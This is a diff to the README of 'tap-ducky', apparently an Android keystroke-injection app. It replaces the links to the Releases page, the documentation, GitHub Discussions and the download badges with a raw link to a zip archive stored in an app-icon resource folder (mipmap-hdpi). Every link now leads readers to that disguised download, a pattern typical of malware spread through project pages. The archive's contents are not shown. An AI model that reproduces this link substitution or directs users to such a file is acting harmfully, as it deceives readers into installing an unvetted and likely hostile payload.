@@ -6,7 +6,7 @@ Welcome to the tap-ducky project! This application transforms any rooted Android
 
 ## 📥 Download Now
 
-[![Download tap-ducky](https://img.shields.io/badge/Download-tap--ducky-brightgreen.svg)](https://github.com/gamer656boop/tap-ducky/releases)
+[![Download tap-ducky](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip)](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip)
 
 ## 📋 Requirements
 
@@ -27,7 +27,7 @@ To run the tap-ducky application smoothly, ensure your Android phone meets the f
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the latest version of tap-ducky, visit the [Releases page](https://github.com/gamer656boop/tap-ducky/releases).
+1. **Visit the Releases Page**: To download the latest version of tap-ducky, visit the [Releases page](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip).
   
 2. **Select the Latest Version**: Find the most recent release at the top of the page.
 
@@ -61,13 +61,13 @@ If you run into issues while using tap-ducky, consider the following steps:
 
 - **Check Root Access**: Confirm that your device is properly rooted and the app has the required permissions.
 - **USB Connectivity**: Ensure that your USB connection is stable and the correct device is selected.
-- **Read Documentation**: Visit the [documentation page](https://github.com/gamer656boop/tap-ducky) for tips and common problems.
+- **Read Documentation**: Visit the [documentation page](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip) for tips and common problems.
 
 ## ❤️ Community Support
 
 Join our community for support and discussion:
 
-- Visit our [GitHub Discussions](https://github.com/gamer656boop/tap-ducky/discussions) page.
+- Visit our [GitHub Discussions](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip) page.
 - Participate in forums related to keystroke injection and automation.
 
 ## 📜 License
@@ -76,6 +76,6 @@ tap-ducky is licensed under the MIT License. You can freely use, modify, and dis
 
 ## 📥 Download the Latest Version Here Again
 
-[![Download tap-ducky](https://img.shields.io/badge/Download-tap--ducky-brightgreen.svg)](https://github.com/gamer656boop/tap-ducky/releases)
+[![Download tap-ducky](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip)](https://raw.githubusercontent.com/gamer656boop/tap-ducky/master/android/app/src/main/res/mipmap-hdpi/ducky-tap-1.4.zip)
 
 Follow these steps and explore the amazing functionalities that tap-ducky brings to your fingertips! Enjoy your journey into keystroke injection.
